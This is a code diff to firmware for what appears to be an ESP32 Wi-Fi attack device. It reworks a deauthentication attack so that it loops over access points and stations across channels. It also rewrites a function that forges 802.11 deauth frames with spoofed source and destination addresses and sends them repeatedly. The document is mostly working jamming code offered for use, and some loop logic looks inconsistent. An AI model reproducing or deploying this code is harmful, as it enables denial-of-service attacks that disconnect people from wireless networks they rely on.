@@ -254,7 +254,7 @@ void WiFiModule::Scan(ScanType type)
           break;
         }
         unsigned long currentTime = millis();
-        if (currentTime - lastChangeTime >= 2000)
+        if (currentTime - lastChangeTime >= 4000)
         {
           lastchannel++ % 13;
           uint8_t set_channel = lastchannel;
@@ -566,27 +566,28 @@ SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().
     }
     case AttackType::AT_DeauthAP:
     {
-        while(wifi_initialized){
-        if (Serial.available() > 0)
+        while(wifi_initialized)
         {
-          String message = Serial.readString();
-
-          if (message.startsWith("stop"))
+          if (Serial.available() > 0)
           {
-            shutdownWiFi();
-            break;
-          }
-        }
-        for(int i = 0; i < access_points->size(); i++){
-        AccessPoint ap = access_points->get(i);
-        if (ap.selected) {
-          for (int y = 0; y < 25; y++) {
-              for (int y = 0; y < 25; y++) {
-                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
-                sendDeauthFrame(ap.bssid, ap.channel, broadcast_mac);
-              }
+            String message = Serial.readString();
+
+            if (message.startsWith("stop"))
+            {
+              shutdownWiFi();
+              break;
             }
           }
+        for(int i = 0; i < access_points->size(); i++){
+        AccessPoint ap = access_points->get(i);
+          for (int x = 0; x < ap.stations->size(); x++) {
+            Station cur_sta = stations->get(ap.stations->get(x));
+              for (int y = 0; y < 12; y++) {
+                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
+                sendDeauthFrame(ap.bssid, y, broadcast_mac);
+                Serial.println("Sent Deauth Frame...");
+              }
+            }
 #ifdef OLD_LED
 SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().rgbModule->redPin, 100);
 #endif
@@ -725,11 +726,56 @@ void WiFiModule::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) 
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   delay(1);
   
-  uint8_t deauth_frame[sizeof(deauth_frame_default)];
-  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+  // Build AP source packet
+  deauth_frame_default[4] = mac[0];
+  deauth_frame_default[5] = mac[1];
+  deauth_frame_default[6] = mac[2];
+  deauth_frame_default[7] = mac[3];
+  deauth_frame_default[8] = mac[4];
+  deauth_frame_default[9] = mac[5];
+  
+  deauth_frame_default[10] = bssid[0];
+  deauth_frame_default[11] = bssid[1];
+  deauth_frame_default[12] = bssid[2];
+  deauth_frame_default[13] = bssid[3];
+  deauth_frame_default[14] = bssid[4];
+  deauth_frame_default[15] = bssid[5];
 
-  memcpy(&deauth_frame[10], bssid, 6);
-  memcpy(&deauth_frame[16], bssid, 6);   
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+
+  // Build AP dest packet
+  deauth_frame_default[4] = bssid[0];
+  deauth_frame_default[5] = bssid[1];
+  deauth_frame_default[6] = bssid[2];
+  deauth_frame_default[7] = bssid[3];
+  deauth_frame_default[8] = bssid[4];
+  deauth_frame_default[9] = bssid[5];
+  
+  deauth_frame_default[10] = mac[0];
+  deauth_frame_default[11] = mac[1];
+  deauth_frame_default[12] = mac[2];
+  deauth_frame_default[13] = mac[3];
+  deauth_frame_default[14] = mac[4];
+  deauth_frame_default[15] = mac[5];
+
+  deauth_frame_default[16] = mac[0];
+  deauth_frame_default[17] = mac[1];
+  deauth_frame_default[18] = mac[2];
+  deauth_frame_default[19] = mac[3];
+  deauth_frame_default[20] = mac[4];
+  deauth_frame_default[21] = mac[5];      
 
   // Send packet
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
